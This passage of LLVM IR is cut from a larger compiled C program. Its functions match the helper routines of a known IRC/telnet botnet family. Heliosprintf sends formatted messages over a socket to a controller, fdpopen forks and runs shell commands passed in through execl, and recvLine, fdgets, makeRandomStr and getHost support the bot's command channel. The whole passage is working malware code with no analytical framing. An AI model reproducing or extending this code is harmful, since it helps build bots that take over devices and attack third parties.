  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @Heliosprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.344, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %62

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %60

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = and i32 %57, 65280
  %59 = ashr i32 %58, 8
  br label %60

; <label>:60:                                     ; preds = %53, %52
  %61 = phi i32 [ -1, %52 ], [ %59, %53 ]
  store i32 %61, i32* %2, align 4
  br label %62

; <label>:62:                                     ; preds = %60, %19
  %63 = load i32, i32* %2, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  br label %43

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4

; <label>:24:                                     ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #10
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #10
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

; <label>:76:                                     ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
